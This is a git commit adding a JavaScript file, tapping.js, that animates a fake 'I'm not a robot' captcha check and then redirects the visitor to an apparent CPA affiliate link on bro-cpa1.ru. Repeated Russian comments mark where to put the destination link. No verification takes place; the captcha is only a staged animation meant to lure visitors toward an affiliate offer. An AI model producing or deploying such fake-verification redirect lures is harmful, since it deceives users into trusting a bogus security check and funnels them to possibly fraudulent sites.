35b5e373a0dd59ecd0edf17a9a80128a42f275a5
gidkhau <61018825+gidkhau@users.noreply.github.com>
2020-02-13 18:42:36 +0300

    Add files via upload

---
+++ tapping.js
@@ -0,0 +1,56 @@
+window.onload = function () {
+    document.getElementById("capcha").onclick = function() {
+
+        document.getElementById("galkanot").classList.remove("showRadius");
+        document.getElementById("galkanot").classList.add("hideRadius");
+        
+        setTimeout(rt, 250);
+        setTimeout(rt2, 1300);
+        setTimeout(rt3, 1700);
+        setTimeout(PEREHOD_PO_SSILKE, 2000);
+        
+
+        function rt() {
+            document.getElementById("galkanot").remove();
+            document.getElementById("galkasppiner").classList.remove("hideRadius")
+            document.getElementById("galkasppiner").classList.add("showRadius");
+        }
+        
+        function rt2() {
+            document.getElementById("galkasppiner").classList.remove("showRadius")
+            document.getElementById("galkasppiner").classList.add("hideRadius");
+        }
+        
+        function rt3() {
+            document.getElementById("galkasppiner").remove();
+            document.getElementById("galkarobotacompleate").classList.remove("hide")
+            document.getElementById("galkarobotacompleate").classList.add("show");
+        }
+        function PEREHOD_PO_SSILKE() {
+        //ССЫЛКА НА САЙТ КУДА ПЕРЕХОДИТЬ |||||||||||||||||||||||||||||||||||||
+        //ССЫЛКА НА САЙТ КУДА ПЕРЕХОДИТЬ |||||||||||||||||||||||||||||||||||||
+        //ССЫЛКА НА САЙТ КУДА ПЕРЕХОДИТЬ |||||||||||||||||||||||||||||||||||||
+        //ССЫЛКА НА САЙТ КУДА ПЕРЕХОДИТЬ |||||||||||||||||||||||||||||||||||||
+        //ССЫЛКА НА САЙТ КУДА ПЕРЕХОДИТЬ |||||||||||||||||||||||||||||||||||||
+        //ССЫЛКА НА САЙТ КУДА ПЕРЕХОДИТЬ |||||||||||||||||||||||||||||||||||||
+        //ССЫЛКА НА САЙТ КУДА ПЕРЕХОДИТЬ |||||||||||||||||||||||||||||||||||||
+        //ССЫЛКА НА САЙТ КУДА ПЕРЕХОДИТЬ |||||||||||||||||||||||||||||||||||||
+        //ССЫЛКА НА САЙТ КУДА ПЕРЕХОДИТЬ |||||||||||||||||||||||||||||||||||||
+
+            location.href = 'http://bro-cpa1.ru/zzX4Sd';
+
+        //ССЫЛКА НА САЙТ КУДА ПЕРЕХОДИТЬ |||||||||||||||||||||||||||||||||||||
+        //ССЫЛКА НА САЙТ КУДА ПЕРЕХОДИТЬ |||||||||||||||||||||||||||||||||||||
+        //ССЫЛКА НА САЙТ КУДА ПЕРЕХОДИТЬ |||||||||||||||||||||||||||||||||||||
+        //ССЫЛКА НА САЙТ КУДА ПЕРЕХОДИТЬ |||||||||||||||||||||||||||||||||||||
+        //ССЫЛКА НА САЙТ КУДА ПЕРЕХОДИТЬ |||||||||||||||||||||||||||||||||||||
+        //ССЫЛКА НА САЙТ КУДА ПЕРЕХОДИТЬ |||||||||||||||||||||||||||||||||||||
+        //ССЫЛКА НА САЙТ КУДА ПЕРЕХОДИТЬ |||||||||||||||||||||||||||||||||||||
+        //ССЫЛКА НА САЙТ КУДА ПЕРЕХОДИТЬ |||||||||||||||||||||||||||||||||||||
+        //ССЫЛКА НА САЙТ КУДА ПЕРЕХОДИТЬ |||||||||||||||||||||||||||||||||||||
+        }
+        
+
+    }
+}
+
